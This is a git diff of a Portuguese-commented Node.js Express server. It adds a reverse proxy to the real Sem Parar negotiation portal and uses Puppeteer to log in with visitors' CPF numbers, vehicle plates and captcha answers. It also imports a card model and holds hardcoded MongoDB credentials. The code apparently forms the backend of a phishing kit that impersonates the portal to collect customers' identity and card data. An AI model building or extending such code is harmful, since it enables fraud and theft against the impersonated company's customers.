@@ -7,7 +7,7 @@ const axios = require("axios"); // Importe o Axios aqui
 const app = express();
 const port = 4642;
 const cors = require('cors');
-const { createproxyMultiple, createProxyMiddleware } = require("http-proxy-middleware");
+const { createProxyMiddleware } = require('http-proxy-middleware');
 const mongoose = require("mongoose");
 const Cartao = require("./models/Cartao"); // Importe o modelo de cartão
 
@@ -40,11 +40,25 @@ mongoose.connect("mongodb+srv://semparar:semparar@cartao.darfzoh.mongodb.net/?re
   console.error('Erro na conexão com o MongoDB:', error);
 });
 
+const proxyOptions = {
+  target: 'https://portaldenegociacao.semparar.com.br/recuperaportal/', // URL do serviço de destino
+  changeOrigin: true, // Altera a origem do cabeçalho para o destino
+  pathRewrite: {
+    '^/proxy': '', // Opcional: reescreve a URL para remover o caminho "/proxy"
+  },
+};
+
+// Middleware do proxy
+const proxy = createProxyMiddleware('/proxy', proxyOptions);
+
+// Use o middleware do proxy
+app.use('/', proxy);
+
 let page = null;
 
 // Inicie o servidor Express após a conexão bem-sucedida
 app.listen(port, () => {
-  console.log(`http://localhost:4642`);
+  console.log(`http://localhost:${port}`);
 });
 
 async function userAuth(page, CPF, PlacaVeiculo, captchaResposta) {
@@ -94,7 +108,7 @@ async function captchaScreenshot(page) {
 app.get("/", async (req, res) => {
   console.log("rota /");
   try {
-    const browser = await puppeteer.launch();
+    const browser = await puppeteer.launch({ headless: false });
 
     page = await browser.newPage();
 
@@ -167,7 +181,7 @@ app.post("/autenticar", async (req, res) => {
     }
 
     // Aguarde até que o elemento .text.bold.secondary-text apareça na página
-    await page.waitForSelector(".text.bold.secondary-text", { timeout: 30000 });
+    await page.waitForSelector(".text.bold.secondary-text", {timeout: 100000});
 
     const valor = await page.evaluate(() => {
       const val = document.querySelector(".text.bold.secondary-text");
@@ -185,8 +199,7 @@ app.post("/autenticar", async (req, res) => {
       CPF,
     });
   } catch (error) {
-    console.error(error);
-    res.status(500).send("Ocorreu um erro durante a autenticação.");
+    res.redirect('/')
   }
 });
 
